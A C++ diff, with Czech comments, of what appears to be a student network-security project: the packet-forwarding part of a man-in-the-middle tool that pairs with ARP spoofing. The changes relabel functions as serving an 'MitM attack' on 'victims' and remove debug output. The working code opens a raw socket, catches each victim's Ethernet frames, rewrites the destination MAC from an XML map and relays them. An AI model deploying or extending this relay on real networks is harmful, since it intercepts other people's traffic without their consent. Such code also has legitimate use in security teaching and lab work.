@@ -167,14 +167,18 @@ void terminate(int signo)
      * this is to debug memory for regression tests
      */
     xmlMemoryDump();	
-	cerr<<"Signo number: "<<signo<<endl;
-	cerr<<"Func: terminate exit(0)"<<endl;	
-    exit(EXIT_SUCCESS);
+	cerr<<"Ukončuji přeposílání komunikace. Doporučuji ukončit spoofing."<<endl;
+//	cerr<<"Signo number: "<<signo<<endl;
+//	cerr<<"Func: terminate exit(0)"<<endl;	
+    exit(signo);
 }
 
-
-static void
-createMap(xmlNode * a_node, std::map<char*,char*> &macMap)
+/**
+ * Funkce pro vytvoření mapy dvojic pro MitM útok ze vstupního XML souboru.
+ * @param a_node - kořen stromu načteného z XML
+ * @param macMap - vytvořená mapa dvojic
+ **/
+static void createMap(xmlNode * a_node, std::map<char*,char*> &macMap)
 {
     xmlNode *cur_node = NULL;
 	std::map<char*,char*>::iterator it;
@@ -198,7 +202,10 @@ createMap(xmlNode * a_node, std::map<char*,char*> &macMap)
     }
 }
 
-
+/**
+ * Funkce pro upravení mapy dvojic na dvojice typu MAC-MAC.
+ * @param macMap - vstupní mapa kd eproběhne úprav
+ **/
 void parseMap(std::map<char*,char*> &macMap){
 	std::map<char*,char*>::iterator tmpIt, it;
 	std::map<char*,char*> tmpMap;
@@ -218,13 +225,11 @@ void parseMap(std::map<char*,char*> &macMap){
 }
 
 /**
- * exampleFunc:
- * @filename: a filename or an URL
- *
- * Parse and validate the resource and free the resulting tree
+ * Funkce pro zpracování vstupního XML souboru do stromu pro snadné vyhledávání.
+ * @param filename - název souboru
+ * @param macMap - mapa pro dvojice MAC-MAC
  */
-static void
-parseTree(const char *filename, std::map<char*,char*> &macMap) {
+static void parseTree(const char *filename, std::map<char*,char*> &macMap) {
     xmlParserCtxtPtr ctxt; /* the parser context */
     xmlDocPtr doc; /* the resulting document tree */
 	xmlNode *root_element = NULL;
@@ -258,7 +263,11 @@ parseTree(const char *filename, std::map<char*,char*> &macMap) {
     xmlFreeParserCtxt(ctxt);
 }
 
-
+/**
+ * Funkce pro přeposílání packetů obětem.
+ * @param macMap - mapa dvojic obětí pro vyhledávání nového cíle po obdržení packetu
+ * @param intInfo - informace o používaném rozhraní
+ */
 void resendPackets(std::map<char*,char*> macMap,INTERFACE_INFO* intInfo)
 {
 	int status, bytes;
@@ -278,50 +287,42 @@ void resendPackets(std::map<char*,char*> macMap,INTERFACE_INFO* intInfo)
 	memcpy (device.sll_addr, intInfo->interfaceMac, 6 * sizeof (uint8_t));
 	device.sll_halen = 6;	
 	
-	// Submit request for a raw socket descriptor.
+	// Vytvoření socketu
 	if ((sockfd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
 		perror ("socket() failed ");
 		exit (EXIT_FAILURE);
 	}
 	
-	// Allocate memory for various arrays.
+	// Alokace paměti pro packet
 	ether_frame = allocate_ustrmem (IP_MAXPACKET);
 	while(1)
 	{
 		if ((status = recv (sockfd, ether_frame, IP_MAXPACKET, 0)) < 0) {
-//			if (errno == EINTR) {
-//				memset (ether_frame, 0, IP_MAXPACKET * sizeof (uint8_t));
-//				continue;  // Something weird happened, but let's try again.
-//			} else {
 			perror ("recv() failed:");
 			exit (EXIT_FAILURE);
-//			}	
 		}
-		
-//		cerr<<"Odchyceno: "<<status<<endl;
 		
 		memcpy (tmpMac, ether_frame + ETH_ADDR_LEN, ETH_ADDR_LEN * sizeof (uint8_t));
 		
-		cerr<<"Odchycen packet od: ";
-		printMAC(tmpMac);
-		cerr<<endl;
-//		cerr<<"Velikost: "<<status<<endl;
-//		
-		cerr<<"Hledám: "<<(char*)macToString(tmpMac).c_str()<<endl;
-		
-		cerr<<"Výpis mapy po:"<<endl;
+		// Iterace nad mapou (ideálně řešeno pomocí loop, ale v časovém presu byla zanesena chyba do zpracování a neporadřilo se ji odstranit)
 		for (std::map<char*,char*>::iterator it=macMap.begin(); it!=macMap.end(); ++it){
-			cerr<<"Key: "<<it->first<<" Value: "<<it->second<<endl;
-			cerr<<"test: "<<(char*)macToString(tmpMac).c_str()<<endl;
+
 			if(strcmp(it->first,(char*)macToString(tmpMac).c_str()) == 0){
 				createMacAdressFromXML(tmpMac,(const xmlChar*)it->second);
-				cerr<<"Přeposílám na: ";
+				
+				//#################################################
+				// Výpis informační
+				cerr<<"Odchycen packet od oběti s MAC adresou: ";
 				printMAC(tmpMac);
 				cerr<<endl;
+				cerr<<"Přeposílám oběti s MAC adresou: ";
+				printMAC(tmpMac);
+				cerr<<endl;
+				//#################################################
+				
 				memcpy (ether_frame, tmpMac, ETH_ADDR_LEN * sizeof (uint8_t));
-		//		memcpy (ethFrame + ETH_ADDR_LEN, srcMac, ETH_ADDR_LEN * sizeof (uint8_t));
 	
-				// Send ethernet frame to socket.
+				// Přeposlání správnéu cíli
 				if ((bytes = sendto (sockfd, ether_frame, status, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
 					perror ("sendto() failed");
 					exit (EXIT_FAILURE);
@@ -336,8 +337,9 @@ void resendPackets(std::map<char*,char*> macMap,INTERFACE_INFO* intInfo)
 /*
  * 
  */
-int main(int argc, char** argv) {
-
+int main(int argc, char** argv)
+{
+	std::map<char*,char*>::iterator it;
 	PARAMS params = {-2,-1,"",""};
 	params = getParams(argc,argv,params);
 	
@@ -350,8 +352,6 @@ int main(int argc, char** argv) {
 	getInterfaceInfo(intInfo,params.interface);	
 	
 	
-	std::map<char*,char*>::iterator it;
-	
 	//návázání spojení s daným interface
 	packetDesc = openInterface(params.interface, "",0);	
 	
@@ -360,30 +360,11 @@ int main(int argc, char** argv) {
 	signal(SIGTERM, terminate);
 	signal(SIGQUIT, terminate);	
 	
-    /*
-     * this initialize the library and check potential ABI mismatches
-     * between the version it was compiled for and the actual shared
-     * library used.
-     */
-//    LIBXML_TEST_VERSION
-
+	// Zpracování vstupního souboru
     parseTree(params.fileName,macMap);
-
-	
-	
-	cerr<<"Výpis mapy po:"<<endl;
-	for (std::map<char*,char*>::iterator it=macMap.begin(); it!=macMap.end(); ++it){
-		cerr<<"Key: "<<it->first<<" Value: "<<it->second<<endl;
-	}	
-	
+	// Přeposílání
 	resendPackets(macMap, intInfo);
-	
-	
-
-//	
-	// Odchytávání packetů a jejich přeposílání
-//	packetSniffer(packetDesc, (pcap_handler)reSendPacket);
-	
+		
 	return (EXIT_SUCCESS);
 }
 
